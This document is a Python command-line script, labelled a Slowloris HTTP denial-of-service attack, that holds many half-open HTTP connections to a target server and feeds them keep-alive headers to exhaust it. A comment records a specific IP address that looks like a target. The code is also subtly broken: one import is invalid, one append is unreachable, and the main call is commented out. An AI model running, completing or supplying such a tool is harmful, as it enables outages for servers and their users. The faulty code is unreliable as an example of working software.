from http import headers
import argparse
import logging
import socket
import random
import sys
import time


parser = argparse.ArgumentParser(description="********** Slowloris HTTP DoS Attack by gunes **********", prog="loris.py")
parser.add_argument('host', nargs="?", help="host being attacked")
parser.add_argument('-p', '--port', default=80, help="port number (Web Server [HTTP] port is 80)", type=int)
parser.add_argument('-s', '--sockets', default=120, help="number of sockets", type=int)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

print(sys.argv)

# 160.153.129.19


sockets = []
ip = args.host
port = args.port


def connect(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((ip, port))

        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))

        for header in headers:
            sock.send("{}\r\n".format(header).encode("utf-8"))

        print(sock.getpeername())

        return sock
    except socket.error as e:
        print("An error occured while connecting to host", args.host + ":" + str(args.port)
        + "\n" , e)


print("\n\nConnecting to:", args.host, "on port:", args.port, "with", args.sockets, "sockets.\n\n")
logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
#logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)


def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking to %s:%s with %s sockets.", ip, port, socket_count)

    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = connect(ip)
        except socket.error:
            break
            sockets.append(s)

    while True:
        logging.info("Sending keep-alive headers... Socket count: %s", len(sockets))
        for s in list(sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                sockets.remove(s)

        for _ in range(socket_count - len(sockets)):
            logging.debug("Recreating socket...")
            try:
                s = connect(ip)
                if s:
                    sockets.append(s)
            except socket.error:
                break
        time.sleep(15)

#main()